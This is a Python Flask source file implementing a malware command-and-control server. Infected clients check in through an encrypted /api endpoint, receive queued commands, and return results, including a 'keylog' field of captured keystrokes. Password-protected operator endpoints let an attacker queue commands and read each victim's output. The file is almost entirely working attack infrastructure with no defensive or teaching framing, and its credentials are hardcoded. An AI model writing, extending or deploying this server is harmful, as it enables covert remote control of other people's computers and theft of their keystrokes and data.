from flask import Flask, request, jsonify, abort
import base64, json, hashlib, os, time
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from functools import wraps
import sqlite3

app = Flask(__name__)
PASSWORD = "YourStrongPassword"
KEY = hashlib.sha256(PASSWORD.encode()).digest()
DB_FILE = "c2server.db"

def encrypt(data): return _encrypt(data)
def _encrypt(data): nonce = os.urandom(12); return nonce + AESGCM(KEY).encrypt(nonce, data, None)

def decrypt(data): return AESGCM(KEY).decrypt(data[:12], data[12:], None)

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients (client_id TEXT PRIMARY KEY, last_seen TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT, command TEXT, sent BOOLEAN DEFAULT 0, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS results (id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT, action TEXT, result TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

def check_auth(username, password): return username == "admin" and password == "adminpass"

def authenticate(): return abort(401, 'Authentication required')

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password): return authenticate()
        return f(*args, **kwargs)
    return decorated


@app.route("/api", methods=["POST"])
def api():
    try:
        enc_data = base64.b64decode(request.data)
        payload = json.loads(decrypt(enc_data))
    except Exception as e:
        return jsonify({"error": str(e)}), 400

    client_id = payload.get("client_id", "unknown")
    action = payload.get("action")
    timestamp = datetime.utcnow()

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO clients(client_id, last_seen) VALUES (?, ?)", (client_id, timestamp))
    conn.commit()

    if action and action != "heartbeat":
        result = payload.get("result") or payload.get("keylog") or ""
        c.execute("INSERT INTO results(client_id, action, result, timestamp) VALUES (?, ?, ?, ?)",
                  (client_id, action, result, timestamp))
        conn.commit()

    c.execute("SELECT id, command FROM commands WHERE client_id=? AND sent=0 ORDER BY timestamp ASC LIMIT 1", (client_id,))
    row = c.fetchone()
    command = None
    if row:
        command_id, command = row
        c.execute("UPDATE commands SET sent=1 WHERE id=?", (command_id,))
        conn.commit()

    conn.close()
    resp = {"command": command}
    return base64.b64encode(encrypt(json.dumps(resp).encode()))


@app.route("/add_command", methods=["POST"])
@requires_auth
def add_command():
    data = request.json
    client_id = data.get("client_id")
    command = data.get("command")
    if not client_id or not command:
        return jsonify({"error": "client_id and command required"}), 400
    conn = sqlite3.connect(DB_FILE)
    conn.cursor().execute("INSERT INTO commands(client_id, command) VALUES (?, ?)", (client_id, command))
    conn.commit()
    conn.close()
    return jsonify({"status": "command added"}), 200


@app.route("/clients", methods=["GET"])
@requires_auth
def list_clients():
    conn = sqlite3.connect(DB_FILE)
    clients = [{"client_id": row[0], "last_seen": row[1]}
               for row in conn.cursor().execute("SELECT client_id, last_seen FROM clients")]
    conn.close()
    return jsonify(clients)


@app.route("/results/<client_id>", methods=["GET"])
@requires_auth
def get_results(client_id):
    conn = sqlite3.connect(DB_FILE)
    results = [{"action": r[0], "result": r[1], "timestamp": r[2]}
               for r in conn.cursor().execute("SELECT action, result, timestamp FROM results WHERE client_id=? ORDER BY timestamp DESC LIMIT 50", (client_id,))]
    conn.close()
    return jsonify(results)


if __name__ == "__main__":
    init_db()
    app.run(host="127.0.0.1", port=5000, debug=False)
